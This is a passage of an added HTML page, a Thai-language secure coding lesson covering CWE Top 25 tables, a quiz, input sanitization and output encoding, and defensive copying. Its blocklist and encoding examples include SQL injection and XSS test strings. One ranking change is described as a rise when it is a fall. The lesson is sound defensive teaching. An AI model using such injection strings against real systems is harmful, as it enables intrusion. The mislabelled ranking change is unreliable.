@@ -1,0 +1,1397 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>บทที่ 9: Secure Coding Practices</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>:root{--primary:#1a56db;--primary-dark:#1340a0;--primary-light:#e8effc;--navy:#1e293b;--navy-light:#334155;--success:#059669;--success-light:#d1fae5;--danger:#dc2626;--danger-light:#fee2e2;--warning:#d97706;--warning-light:#fef3c7;--purple:#7c3aed;--purple-light:#ede9fe;--bg:#f8fafc;--bg-card:#fff;--text:#1e293b;--text-muted:#64748b;--border:#e2e8f0;--shadow:0 4px 6px -1px rgba(0,0,0,.1),0 2px 4px -2px rgba(0,0,0,.1);--shadow-lg:0 10px 15px -3px rgba(0,0,0,.1),0 4px 6px -4px rgba(0,0,0,.1);--radius:12px;--radius-sm:8px;--sidebar-w:292px;--font-thai:'Sarabun',sans-serif;--font-mono:'IBM Plex Mono',monospace}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}html{scroll-behavior:smooth;font-size:16px}body{font-family:var(--font-thai);background:var(--bg);color:var(--text);line-height:1.8;display:flex;min-height:100vh}a{color:var(--primary);text-decoration:none}a:hover{text-decoration:underline}.sidebar{position:fixed;inset:0 auto 0 0;width:var(--sidebar-w);height:100vh;background:var(--navy);color:#fff;overflow-y:auto;z-index:100;transition:transform .3s}.sidebar-header{padding:1.5rem 1.25rem;border-bottom:1px solid rgba(255,255,255,.1)}.sidebar-header h1{font-size:1rem;font-weight:600;color:#fff;line-height:1.4}.sidebar-header .sub{font-size:.75rem;color:#94a3b8;margin-top:.25rem}.sidebar-nav{padding:.75rem 0}.sidebar-nav a{display:block;padding:.5rem 1.25rem;color:#cbd5e1;font-size:.84rem;transition:all .15s;border-left:3px solid transparent}.sidebar-nav a:hover,.sidebar-nav a.active{color:#fff;background:rgba(255,255,255,.08);border-left-color:var(--primary);text-decoration:none}.sidebar-nav .section-label{padding:.6rem 1.25rem .25rem;font-size:.7rem;text-transform:uppercase;letter-spacing:.05em;color:#94a3b8;font-weight:600}.sidebar-nav .sub-link{padding-left:2.35rem;font-size:.78rem}.sidebar-toggle{display:none;position:fixed;top:.75rem;left:.75rem;z-index:200;background:var(--navy);color:#fff;border:none;width:44px;height:44px;border-radius:var(--radius-sm);cursor:pointer;font-size:1.5rem;align-items:center;justify-content:center}.sidebar-overlay{display:none}.main{flex:1;margin-left:var(--sidebar-w);max-width:100%;padding:0}.topbar{position:sticky;top:0;z-index:50;background:rgba(248,250,252,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:.75rem 2rem;display:flex;align-items:center;justify-content:space-between}.topbar-title{font-size:.85rem;color:var(--text-muted)}.topbar-title strong{color:var(--text);font-weight:600}.topbar-progress{font-size:.8rem;color:var(--text-muted)}.topbar-home{color:var(--text-muted);font-size:.85rem;text-decoration:none;margin-right:.75rem;transition:color.15s;white-space:nowrap}.topbar-home:hover{color:var(--primary);text-decoration:none}.content{padding:2rem;max-width:1040px;margin:0 auto}.content h2{font-size:1.65rem;font-weight:600;margin:2.5rem 0 1rem;color:var(--navy);border-bottom:2px solid var(--border);padding-bottom:.5rem}.content h3{font-size:1.2rem;font-weight:600;margin:1.75rem 0 .75rem;color:var(--navy-light)}.content h4{font-size:1.05rem;font-weight:600;margin:1.25rem 0 .5rem;color:var(--text)}.content p{margin-bottom:.85rem}.content ul,.content ol{margin-bottom:.85rem;padding-left:1.4rem}.content li{margin-bottom:.3rem}.card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem;margin-bottom:1.5rem;box-shadow:var(--shadow)}.card-header{font-size:1.05rem;font-weight:600;color:var(--navy);margin-bottom:.75rem}.info-box{display:flex;gap:.85rem;padding:1rem 1.15rem;border-radius:var(--radius-sm);margin:1.25rem 0;border-left:4px solid;align-items:flex-start;background:var(--bg-card);border:1px solid var(--border);border-left-width:4px}.info-box .icon{font-size:1.3rem;flex-shrink:0;line-height:1.5}.info-box.warning{border-left-color:var(--warning);background:var(--warning-light)}.info-box.danger{border-left-color:var(--danger);background:var(--danger-light)}.info-box.remember{border-left-color:var(--primary);background:var(--primary-light)}.info-box.question{border-left-color:var(--purple);background:var(--purple-light)}.table-wrap{overflow-x:auto;margin:1rem 0 1.25rem}.table-wrap table{width:100%;border-collapse:collapse;font-size:.9rem;min-width:500px}.table-wrap th,.table-wrap td{padding:.6rem .75rem;text-align:left;border:1px solid var(--border)}.table-wrap th{background:var(--navy);color:#fff;font-weight:600;font-size:.85rem}.table-wrap tr:nth-child(even){background:#f1f5f9}.table-wrap tr:hover{background:var(--primary-light)}pre{background:#1e293b;color:#e2e8f0;padding:1rem;border-radius:var(--radius-sm);overflow-x:auto;font-size:.82rem;line-height:1.6;margin:.85rem 0;font-family:var(--font-mono);tab-size:4}code{font-family:var(--font-mono);font-size:.88em;background:#f1f5f9;padding:.15em .35em;border-radius:4px;color:#b91c1c}pre code{background:0 0;padding:0;color:inherit;font-size:.82rem}.interactive{background:var(--bg-card);border:2px solid var(--primary-light);border-radius:var(--radius);padding:1.5rem;margin:1.25rem 0;box-shadow:var(--shadow)}.interactive h4{margin-top:0;color:var(--primary)}.tab-bar{display:flex;gap:4px;margin-bottom:1rem;flex-wrap:wrap}.tab-btn{padding:.5rem 1rem;border:1px solid var(--border);background:var(--bg);cursor:pointer;border-radius:var(--radius-sm);font-size:.88rem;font-family:var(--font-thai);transition:all .15s;color:var(--text-muted)}.tab-btn.active{background:var(--primary);color:#fff;border-color:var(--primary)}.tab-btn:hover:not(.active){background:var(--primary-light)}.tab-panel{display:none;padding:.85rem;background:#f8fafc;border-radius:var(--radius-sm);border:1px solid var(--border);line-height:1.7}.tab-panel.active{display:block}.quiz-option{display:block;width:100%;padding:.7rem 1rem;margin-bottom:.5rem;border:2px solid var(--border);border-radius:var(--radius-sm);background:var(--bg);cursor:pointer;font-size:.92rem;text-align:left;font-family:var(--font-thai);transition:all .15s;color:var(--text)}.quiz-option:hover{border-color:var(--primary);background:var(--primary-light)}.quiz-option.correct{border-color:var(--success);background:var(--success-light);color:#065f46}.quiz-option.incorrect{border-color:var(--danger);background:var(--danger-light);color:#991b1b}.result{padding:.6rem 0;font-size:.88rem;font-weight:500;color:var(--text-muted);min-height:1.8rem}.checklist label{display:flex;align-items:flex-start;gap:.55rem;padding:.4rem 0;cursor:pointer;font-size:.92rem;border-bottom:1px solid var(--border)}.checklist label:last-child{border-bottom:0}.checklist input[type=checkbox]{margin-top:.25rem;width:18px;height:18px;accent-color:var(--primary);flex-shrink:0;cursor:pointer}.meter{height:8px;background:#e2e8f0;border-radius:4px;margin-top:.75rem;overflow:hidden}.meter-fill{height:100%;width:0;background:var(--success);border-radius:4px;transition:width .3s}.memory-card-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:.75rem;margin:.85rem 0}.memory-card{border:2px solid var(--border);border-radius:var(--radius-sm);padding:1rem;cursor:pointer;text-align:center;transition:all .2s;background:var(--bg);min-height:90px;display:flex;flex-direction:column;justify-content:center;align-items:center}.memory-card:hover{border-color:var(--primary);box-shadow:var(--shadow)}.memory-card .card-title{font-weight:600;font-size:.92rem;color:var(--navy);margin-bottom:.3rem}.memory-card .card-desc{font-size:.8rem;color:var(--text-muted);display:none}.memory-card .card-desc.show{display:block}.memory-card .card-icon{font-size:1.5rem;margin-bottom:.3rem}.memory-card.expanded{border-color:var(--primary);background:var(--primary-light)}@media(max-width:1024px){.sidebar{transform:translateX(-100%)}.sidebar.open{transform:translateX(0)}.sidebar-toggle{display:flex}.sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:99}.sidebar-overlay.show{display:block}.main{margin-left:0}.content{padding:1.25rem}.topbar{padding:.65rem 1rem}.topbar-title{font-size:.78rem}}@media(max-width:640px){.content{padding:1rem}pre{font-size:.75rem}.table-wrap table{font-size:.8rem}.tab-btn{font-size:.8rem;padding:.4rem .65rem}.memory-card-grid{grid-template-columns:1fr 1fr}}.flex-pair{display:flex;gap:1rem;margin:.85rem 0;flex-wrap:wrap}.flex-pair>div{flex:1;min-width:220px;padding:1rem;border-radius:var(--radius-sm);border:1px solid var(--border)}.flex-pair .pair-title{font-weight:600;font-size:.92rem;margin-bottom:.35rem}.flex-pair .pair-desc{font-size:.85rem;color:var(--text-muted)}@media print{.sidebar,.sidebar-toggle,.sidebar-overlay,.topbar,.interactive{display:none!important}.main{margin-left:0}.content{max-width:100%}pre{white-space:pre-wrap;page-break-inside:avoid}h2{page-break-after:avoid}}</style>
+</head>
+<body>
+<button class="sidebar-toggle" id="sidebarToggle" aria-label="เปิดเมนู">☰</button>
+<div class="sidebar-overlay" id="sidebarOverlay"></div>
+<nav class="sidebar" id="sidebar" role="navigation" aria-label="สารบัญ">
+  <div class="sidebar-header"><h1>Secure Coding Practices</h1><div class="sub">บทที่ 9 · Interactive Learning</div></div>
+  <div class="sidebar-nav">
+    <div class="section-label">เนื้อหา</div>
+    <a href="#s1">9.1 Defensive Programming</a><a href="#s1-1" class="sub-link">Secure Coding Standards</a><a href="#s1-2" class="sub-link">Input Sanitization &amp; Output Encoding</a><a href="#s1-3" class="sub-link">Immutable Objects &amp; Defensive Copying</a><a href="#s1-4" class="sub-link">Fail Fast vs Fail Safe</a><a href="#s1-5" class="sub-link">Integer Overflow &amp; Type Safety</a>
+    <a href="#s2">9.2 การจัดการ Error และ Exception</a><a href="#s2-1" class="sub-link">หลักการจัดการ Exception</a><a href="#s2-2" class="sub-link">Error Messages — สิ่งที่ห้ามเปิดเผย</a><a href="#s2-3" class="sub-link">Global Error Handler</a><a href="#s2-4" class="sub-link">Custom Error Pages</a><a href="#s2-5" class="sub-link">Unhandled Exception &amp; Resource Leak</a>
+    <a href="#s3">9.3 Memory Safety</a><a href="#s3-1" class="sub-link">Buffer Overflow</a><a href="#s3-2" class="sub-link">Memory Protection Mechanisms</a><a href="#s3-3" class="sub-link">Memory-safe Languages</a><a href="#s3-4" class="sub-link">Use-after-Free</a><a href="#s3-5" class="sub-link">Format String Vulnerabilities</a>
+    <a href="#s4">9.4 Secure File และ Resource Management</a><a href="#s4-1" class="sub-link">Path Traversal Prevention</a><a href="#s4-2" class="sub-link">File Permission Management</a><a href="#s4-3" class="sub-link">File Upload Security</a><a href="#s4-4" class="sub-link">Temporary File Management</a><a href="#s4-5" class="sub-link">TOCTOU Race Condition</a>
+    <a href="#s5">9.5 การป้องกันข้อมูลรั่วไหลใน Log</a><a href="#s5-1" class="sub-link">ข้อมูลที่ห้าม Log</a><a href="#s5-2" class="sub-link">Log Sanitization และ Masking</a><a href="#s5-3" class="sub-link">Centralized Logging</a><a href="#s5-4" class="sub-link">Secure Log Storage</a>
+    <a href="#s6">9.6 กรณีศึกษาและเหตุการณ์จริง</a><a href="#s6-1" class="sub-link">Heartbleed (Buffer Over-read)</a><a href="#s6-2" class="sub-link">Morris Worm (1988)</a><a href="#s6-3" class="sub-link">WannaCry / EternalBlue</a><a href="#s6-4" class="sub-link">Atlassian File Upload</a><a href="#s6-5" class="sub-link">Log4Shell (Log Injection)</a>
+    <a href="#s7">9.7 สรุปและแนวทางปฏิบัติ</a><a href="#s7-1" class="sub-link">Secure Coding Checklist</a><a href="#s7-2" class="sub-link">Top 10 Secure Coding Practices</a><a href="#s7-3" class="sub-link">CWE Top 25 Mapping</a>
+    <div class="section-label">กิจกรรม</div>
+    <a href="#labs">Labs 9.1 — 9.4</a><a href="#keywords">Keywords</a><a href="#questions">คำถามท้ายบท</a><a href="#refs">เอกสารอ้างอิง</a>
+  </div>
+</nav>
+<div class="main">
+  <header class="topbar"><a href="index.html" class="topbar-home" aria-label="กลับหน้าแรก">← HOME</a><div class="topbar-title"><strong>บทที่ 9</strong> · Secure Coding Practices</div><div class="topbar-progress" id="readingProgress">Software Security</div></header>
+  <div class="content">
+    <div style="text-align:center;padding:2rem 0 1rem"><span style="display:inline-block;background:var(--primary);color:#fff;padding:.25rem 1rem;border-radius:50px;font-size:.85rem;margin-bottom:1rem">บทที่ 9</span><h1 style="font-size:2.25rem;color:var(--navy);margin-bottom:.5rem;border:none">Secure Coding Practices</h1><p style="color:var(--text-muted);font-size:1rem">บรรยาย 2 ชม. + ปฏิบัติการ 3 ชม. | รวม 5 ชม.</p></div>
+    <div class="card" style="background:var(--navy-light);color:#fff;border:1px solid rgba(255,255,255,.15);box-shadow:0 4px 20px rgba(247,245,245,0.25)"><div class="card-header" style="color:#fff">วัตถุประสงค์การเรียนรู้</div><ol style="color:#fff;padding-left:1.25rem">
+      <li>เข้าใจหลักการเขียนโปรแกรมที่ปลอดภัยตามมาตรฐาน OWASP, CERT/SEI, และ CWE Top 25</li>
+      <li>ใช้เทคนิค Defensive Programming รวมถึง Immutable Objects, Defensive Copying, Fail Safe และ Fail Fast</li>
+      <li>จัดการ Error และ Exception อย่างปลอดภัยโดยไม่รั่วไหลข้อมูลสำคัญ</li>
+      <li>อธิบายและป้องกัน Buffer Overflow, Use-after-Free, และ Format String Vulnerabilities</li>
+      <li>จัดการ File Upload และ Resource Management อย่างปลอดภัย ป้องกัน Path Traversal และ TOCTOU Race Condition</li>
+      <li>เขียน Log ที่ปลอดภัย ไม่รั่วไหลรหัสผ่าน, Secrets, หรือ PII</li>
+      <li>ใช้ Memory-safe Practices และ Language Features เพื่อป้องกันช่องโหว่ระดับหน่วยความจำ</li>
+      <li>ใช้ SAST Tools (Semgrep, CodeQL) ในการตรวจจับ Secure Coding Violations</li>
+    </ol></div>
+    <div class="info-box warning"><div class="icon">⚠️</div><div><strong>ข้อกำหนดด้านจริยธรรมของบทนี้:</strong> บทนี้ครอบคลุมแนวปฏิบัติการเขียนโค้ดที่ปลอดภัย (Secure Coding Practices) เพื่อป้องกันช่องโหว่ในซอฟต์แวร์ เนื้อหามีตัวอย่างโค้ดที่มีช่องโหว่และการแก้ไขเพื่อการศึกษาเท่านั้น กิจกรรมปฏิบัติการทั้งหมดต้องทำในสภาพแวดล้อมที่ได้รับอนุญาต เช่น เครื่องของนักศึกษาเอง เซิร์ฟเวอร์ทดลอง หรือแอปพลิเคชันตัวอย่างที่อาจารย์จัดให้เท่านั้น ห้ามนำเทคนิคในบทนี้ไปใช้กับระบบของบุคคลอื่นหรือระบบที่ไม่ได้รับอนุญาตเป็นลายลักษณ์อักษรโดยเด็ดขาด <strong>ข้อควรจำ:</strong> การเขียนโค้ดที่ปลอดภัยเป็นหน้าที่ของนักพัฒนาทุกคน ไม่ใช่แค่ทีมความปลอดภัย — ช่องโหว่ส่วนใหญ่มีต้นเหตุจากการเขียนโค้ดโดยไม่คำนึงถึงความปลอดภัย</div></div>
+    <h2 id="plan">แผนการเรียนรู้สำหรับ 5 ชั่วโมง</h2><div class="table-wrap"><table><thead><tr><th>ช่วงเวลา</th><th>หัวข้อ</th><th>เป้าหมายการเรียนรู้</th><th>กิจกรรมในชั้นเรียน</th></tr></thead><tbody>
+      <tr><td>ชั่วโมงที่ 1</td><td>Defensive Programming และ Secure Coding Standards</td><td>เข้าใจหลักการเขียนโค้ดป้องกัน และมาตรฐาน OWASP/CERT/CWE Top 25</td><td>เปรียบเทียบ Fail Fast กับ Fail Safe และวิเคราะห์ตัวอย่าง Defensive Copying</td></tr>
+      <tr><td>ชั่วโมงที่ 2</td><td>การจัดการ Error และ Exception อย่างปลอดภัย</td><td>เข้าใจการออกแบบ Error Handler, Global Handler, และ Error Messages ที่ไม่รั่วไหลข้อมูล</td><td>วิเคราะห์ตัวอย่าง Stack Trace ที่รั่วไหลข้อมูลสำคัญและออกแบบ Custom Error Page</td></tr>
+      <tr><td>ชั่วโมงที่ 3</td><td>Memory Safety และ Buffer Overflow</td><td>เข้าใจ Buffer Overflow, Stack Canary, ASLR, และ Format String Attacks</td><td>ทดลอง Buffer Overflow ในสภาพแวดล้อม Sandbox และวิเคราะห์ Memory-safe Languages</td></tr>
+      <tr><td>ชั่วโมงที่ 4</td><td>Secure File และ Resource Management</td><td>เข้าใจ Path Traversal, File Upload, TOCTOU</td><td>ตรวจสอบ File Upload Validation และเขียนโค้ดป้องกัน TOCTOU</td></tr>
+      <tr><td>ชั่วโมงที่ 5</td><td>Lab 9.1 — 9.4</td><td>ฝึก Code Review, SAST Scanning, File Upload Security และ Exception Handling</td><td>ใช้ Semgrep, จัดการ File Upload, และเขียน Global Error Handler</td></tr>
+    </tbody></table></div>    <h2 id="s1">9.1 Defensive Programming</h2>
+    <p>Defensive Programming (การเขียนโปรแกรมเชิงป้องกัน) เป็นแนวคิดที่นักพัฒนาต้องเขียนโค้ดโดยสมมติว่าสิ่งที่ผิดพลาดได้จะผิดพลาดเสมอ (Murphy's Law) — ข้อมูลนำเข้าอาจไม่ถูกต้อง ฟังก์ชันอาจล้มเหลว และผู้ใช้หรือผู้โจมตีพยายามทำให้ระบบทำงานผิดปกติ</p>
+    <h3 id="s1-1">9.1.1 Secure Coding Standards และกรอบอ้างอิง</h3>
+    <p>มาตรฐานการเขียนโค้ดที่ปลอดภัยมีหลายกรอบอ้างอิงที่นักพัฒนาควรรู้จัก:</p>
+    <div class="table-wrap"><table><thead><tr><th>มาตรฐาน</th><th>องค์กร</th><th>รายละเอียด</th></tr></thead><tbody>
+      <tr><td><strong>OWASP Developer Guide</strong> (เดิม OWASP Secure Coding Practices — ถูก Archive แล้ว)</td><td>OWASP</td><td>แนวทางปฏิบัติสำหรับเขียนโค้ดปลอดภัย ปัจจุบันรวมอยู่ใน OWASP Developer Guide</td></tr>
+      <tr><td><strong>CERT Secure Coding Standards</strong></td><td>CERT/SEI (Carnegie Mellon)</td><td>มาตรฐานสำหรับ C, C++, Java, Perl — ระบุช่องโหว่และแนวทางแก้ไข</td></tr>
+      <tr><td><strong>CWE Top 25 Most Dangerous Software Weaknesses</strong></td><td>MITRE</td><td>รายการจุดอ่อนซอฟต์แวร์ที่อันตรายที่สุด 25 อันดับ</td></tr>
+      <tr><td><strong>NIST SP 800-218 (SSDF)</strong></td><td>NIST</td><td>Secure Software Development Framework — แนวทางปฏิบัติสำหรับ Secure SDLC</td></tr>
+      <tr><td><strong>SEI CERT Oracle Coding Standard for Java</strong></td><td>CERT/SEI</td><td>มาตรฐาน Secure Coding สำหรับ Java โดยเฉพาะ</td></tr>
+      <tr><td><strong>MISRA</strong></td><td>MISRA Consortium</td><td>มาตรฐานสำหรับระบบ Embedded และ Automotive (C/C++)</td></tr>
+    </tbody></table></div>
+    <div class="interactive" id="play-cwe">
+      <h4>Interactive: CWE Top 25 Quiz (2025)</h4>
+      <p>เลือกช่องโหว่ที่ตรงกับคำอธิบายด้านล่าง</p>
+      <p style="font-weight:500;color:var(--navy)">ข้อ 1: ช่องโหว่ที่เกิดจากการเขียนข้อมูลเกินขนาด Buffer ที่จองไว้ ส่งผลให้เขียนทับ Return Address — อยู่ในอันดับ 5 ของ CWE Top 25</p>
+      <button class="quiz-option" data-quiz="cwe1" data-correct="false">CWE-79 (XSS)</button>
+      <button class="quiz-option" data-quiz="cwe1" data-correct="true">CWE-787 (Out-of-bounds Write)</button>
+      <button class="quiz-option" data-quiz="cwe1" data-correct="false">CWE-22 (Path Traversal)</button>
+      <button class="quiz-option" data-quiz="cwe1" data-correct="false">CWE-89 (SQL Injection)</button>
+      <div id="cwe1Result" class="result">คลิกเพื่อเลือกคำตอบ</div>
+      <p style="font-weight:500;color:var(--navy);margin-top:1.25rem">ข้อ 2: ช่องโหว่ที่เกิดจากการใช้ Pointer ที่ชี้ไปยังหน่วยความจำที่ถูกคืนแล้ว — Memory Safety Issue</p>
+      <button class="quiz-option" data-quiz="cwe2" data-correct="false">CWE-120 (Classic Buffer Overflow)</button>
+      <button class="quiz-option" data-quiz="cwe2" data-correct="false">CWE-476 (NULL Pointer Dereference)</button>
+      <button class="quiz-option" data-quiz="cwe2" data-correct="true">CWE-416 (Use After Free)</button>
+      <button class="quiz-option" data-quiz="cwe2" data-correct="false">CWE-78 (OS Command Injection)</button>
+      <div id="cwe2Result" class="result">คลิกเพื่อเลือกคำตอบ</div>
+      <p style="font-weight:500;color:var(--navy);margin-top:1.25rem">ข้อ 3: ช่องโหว่ที่เกิดจากการไม่ตรวจสอบสิทธิ์ก่อนเข้าถึง Resource — พุ่งขึ้นจากอันดับ 16 → 4 ในปี 2025</p>
+      <button class="quiz-option" data-quiz="cwe3" data-correct="true">CWE-862 (Missing Authorization)</button>
+      <button class="quiz-option" data-quiz="cwe3" data-correct="false">CWE-20 (Improper Input Validation)</button>
+      <button class="quiz-option" data-quiz="cwe3" data-correct="false">CWE-352 (CSRF)</button>
+      <button class="quiz-option" data-quiz="cwe3" data-correct="false">CWE-434 (Unrestricted File Upload)</button>
+      <div id="cwe3Result" class="result">คลิกเพื่อเลือกคำตอบ</div>
+    </div>
+    <p><strong>CWE Top 25 (2025) ที่เกี่ยวข้องกับ Secure Coding:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th style="text-align:center">อันดับ</th><th>CWE ID</th><th>ชื่อ</th><th>ความเกี่ยวข้อง</th></tr></thead><tbody>
+      <tr><td style="text-align:center">1</td><td>CWE-79</td><td>Cross-site Scripting (XSS)</td><td>Output Encoding</td></tr>
+      <tr><td style="text-align:center">2</td><td>CWE-89</td><td>SQL Injection</td><td>Input Validation</td></tr>
+      <tr><td style="text-align:center">3</td><td>CWE-352</td><td>Cross-Site Request Forgery</td><td>Session Management</td></tr>
+      <tr><td style="text-align:center">4</td><td>CWE-862</td><td>Missing Authorization</td><td>Access Control</td></tr>
+      <tr><td style="text-align:center">5</td><td>CWE-787</td><td>Out-of-bounds Write</td><td>Memory Safety — Buffer Overflow</td></tr>
+      <tr><td style="text-align:center">6</td><td>CWE-22</td><td>Path Traversal</td><td>File Management</td></tr>
+      <tr><td style="text-align:center">7</td><td>CWE-416</td><td>Use After Free</td><td>Memory Safety</td></tr>
+      <tr><td style="text-align:center">8</td><td>CWE-125</td><td>Out-of-bounds Read</td><td>Memory Safety</td></tr>
+      <tr><td style="text-align:center">9</td><td>CWE-78</td><td>OS Command Injection</td><td>Input Validation</td></tr>
+      <tr><td style="text-align:center">10</td><td>CWE-94</td><td>Code Injection</td><td>Input Validation</td></tr>
+      <tr><td style="text-align:center">11</td><td>CWE-120</td><td>Classic Buffer Overflow</td><td>Memory Safety</td></tr>
+      <tr><td style="text-align:center">12</td><td>CWE-434</td><td>Unrestricted File Upload</td><td>File Management</td></tr>
+      <tr><td style="text-align:center">13</td><td>CWE-476</td><td>NULL Pointer Dereference</td><td>Error Handling</td></tr>
+      <tr><td style="text-align:center">14</td><td>CWE-121</td><td>Stack-based Buffer Overflow</td><td>Memory Safety</td></tr>
+      <tr><td style="text-align:center">15</td><td>CWE-502</td><td>Deserialization of Untrusted Data</td><td>Input Validation</td></tr>
+      <tr><td style="text-align:center">16</td><td>CWE-122</td><td>Heap-based Buffer Overflow</td><td>Memory Safety</td></tr>
+      <tr><td style="text-align:center">17</td><td>CWE-863</td><td>Incorrect Authorization</td><td>Access Control</td></tr>
+      <tr><td style="text-align:center">18</td><td>CWE-20</td><td>Improper Input Validation</td><td>Input Validation</td></tr>
+      <tr><td style="text-align:center">19</td><td>CWE-284</td><td>Improper Access Control</td><td>Access Control</td></tr>
+      <tr><td style="text-align:center">20</td><td>CWE-200</td><td>Exposure of Sensitive Information</td><td>Error Handling / Logging</td></tr>
+      <tr><td style="text-align:center">21</td><td>CWE-306</td><td>Missing Authentication</td><td>Authentication</td></tr>
+      <tr><td style="text-align:center">22</td><td>CWE-918</td><td>Server-Side Request Forgery</td><td>Input Validation</td></tr>
+      <tr><td style="text-align:center">23</td><td>CWE-77</td><td>Command Injection</td><td>Input Validation</td></tr>
+      <tr><td style="text-align:center">24</td><td>CWE-639</td><td>Authorization Bypass Through User-Controlled Key</td><td>Access Control</td></tr>
+      <tr><td style="text-align:center">25</td><td>CWE-770</td><td>Allocation Without Limits/Throttling</td><td>Resource Management</td></tr>
+    </tbody></table></div>
+    <p><strong>การเปลี่ยนแปลงสำคัญจาก CWE Top 25 2024 สู่ 2025:</strong></p>
+    <ul>
+      <li>CWE-352 (CSRF) พุ่งขึ้นจากอันดับ 9 → 3</li>
+      <li>CWE-862 (Missing Authorization) พุ่งขึ้นจากอันดับ 16 → 4</li>
+      <li>CWE-20 (Improper Input Validation) ร่วงจากอันดับ 6 → 18</li>
+      <li>CWE-476 (NULL Pointer Dereference) พุ่งขึ้นจากอันดับ 11 → 13</li>
+      <li><strong>รายการใหม่:</strong> CWE-120 (Classic Buffer Overflow), CWE-121 (Stack-based BOF), CWE-122 (Heap-based BOF), CWE-284 (Improper Access Control), CWE-639 (Authorization Bypass), CWE-770 (Allocation Without Limits)</li>
+      <li><strong>รายการที่หลุด:</strong> CWE-190 (Integer Overflow), CWE-287 (Improper Authentication), CWE-798 (Hard-coded Credentials), CWE-119 (Buffer Overflow — ถูกแยกย่อย), CWE-276 (Incorrect Default Permissions), CWE-362 (Race Condition), CWE-400 (Resource Exhaustion), CWE-611 (XXE)</li>
+    </ul>
+    <h3 id="s1-2">9.1.2 Input Sanitization และ Output Encoding (ทบทวน)</h3>
+    <p>จากบทที่ 5 Input Validation และ Injection Attacks การ Sanitize ข้อมูลนำเข้าและ Encode ข้อมูลส่งออกเป็นแนวปฏิบัติสำคัญที่สุดในการป้องกัน Injection Attacks</p>
+    <p><strong>หลักการสำคัญ — Trust Boundary:</strong></p>
+    <pre><code>ข้อมูลจากผู้ใช้ → [Trust Boundary] → ระบบของเรา</code></pre>
+    <p>ทุกอย่างที่อยู่หน้า Trust Boundary (User Input, Third-party API, File Upload, Database) ต้องถูกตรวจสอบก่อนนำไปใช้</p>
+    <p><strong>แนวทางปฏิบัติ:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>แนวทาง</th><th>คำอธิบาย</th><th>ตัวอย่าง</th></tr></thead><tbody>
+      <tr><td><strong>Allowlist Validation</strong></td><td>อนุญาตเฉพาะค่าที่กำหนดไว้ล่วงหน้า</td><td><code>^[a-zA-Z0-9_]{3,20}$</code></td></tr>
+      <tr><td><strong>Blocklist Validation</strong></td><td>ปิดกั้นค่าที่ไม่ต้องการ</td><td>กรอง <code>&lt;script&gt;</code>, <code>' OR 1=1 --</code></td></tr>
+      <tr><td><strong>Sanitization</strong></td><td>ลบหรือแก้ไขข้อมูลอันตราย</td><td>ลบแท็ก HTML, Escape Special Characters</td></tr>
+      <tr><td><strong>Output Encoding</strong></td><td>แปลงข้อมูลก่อนแสดงผลตาม Context</td><td>HTML Encode, URL Encode, JavaScript Encode</td></tr>
+    </tbody></table></div>
+    <p><strong>ตัวอย่าง Context-aware Output Encoding:</strong></p>
+    <pre><code>import html
+
+user_input = '&lt;script&gt;alert("XSS")&lt;/script&gt;'
+safe_output = html.escape(user_input, quote=True)
+# Output: &amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;)&amp;lt;/script&amp;gt;</code></pre>
+    <div class="table-wrap"><table><thead><tr><th>Context</th><th>Encoding Method</th><th>ตัวอย่าง</th></tr></thead><tbody>
+      <tr><td>HTML Body</td><td>HTML Entity Encoding</td><td><code>&amp;</code> → <code>&amp;amp;</code>, <code>&lt;</code> → <code>&amp;lt;</code></td></tr>
+      <tr><td>HTML Attribute</td><td>HTML Attribute Encoding</td><td><code>"</code> → <code>&amp;quot;</code></td></tr>
+      <tr><td>JavaScript</td><td>JavaScript Unicode Escaping</td><td><code>'</code> → <code>\x27</code>, <code>"</code> → <code>\x22</code></td></tr>
+      <tr><td>URL</td><td>URL Encoding (Percent Encoding)</td><td><code>&lt;space&gt;</code> → <code>%20</code></td></tr>
+      <tr><td>CSS</td><td>CSS Escaping</td><td>special chars → <code>\XX</code></td></tr>
+    </tbody></table></div>
+    <h3 id="s1-3">9.1.3 Immutable Objects และ Defensive Copying</h3>
+    <p><strong>Immutable Objects:</strong></p>
+    <p>Immutable Object คือ Object ที่ไม่สามารถเปลี่ยนแปลงสถานะได้หลังจากถูกสร้างขึ้น — ทุกครั้งที่ต้องการ "เปลี่ยนแปลง" จะสร้าง Object ใหม่แทน</p>
+    <pre><code># Mutable — ไม่ปลอดภัย
+class User:
+    def __init__(self, name, roles):
+        self.name = name
+        self.roles = roles  # list — สามารถแก้ไขได้จากภายนอก
+
+# Immutable — ปลอดภัยกว่า
+class User:
+    def __init__(self, name, roles):
+        self._name = name
+        self._roles = tuple(roles)  # tuple — ไม่สามารถแก้ไขได้
+    
+    @property
+    def name(self):
+        return self._name
+    
+    @property
+    def roles(self):
+        return self._roles  # คืนค่า tuple — caller แก้ไขไม่ได้</code></pre>
+    <pre><code>// Java: Immutable Class
+public final class User {
+    private final String name;
+    private final List&lt;String&gt; roles;
+    
+    public User(String name, List&lt;String&gt; roles) {
+        this.name = name;
+        this.roles = new ArrayList&lt;&gt;(roles); // Defensive Copy
+    }
+    
+    public String getName() { return name; }
+    
+    public List&lt;String&gt; getRoles() {
+        return Collections.unmodifiableList(roles); // Unmodifiable view
+    }
+}</code></pre>
+    <p><strong>Defensive Copying:</strong></p>
+    <p>Defensive Copying คือการทำสำเนาข้อมูลก่อนนำไปใช้หรือจัดเก็บ เพื่อป้องกันการแก้ไขจากภายนอก</p>
+    <pre><code>// ไม่ปลอดภัย: ไม่มี Defensive Copy
+public class BankAccount {
+    private byte[] accountNumber;
+    
+    public void setAccountNumber(byte[] accountNumber) {
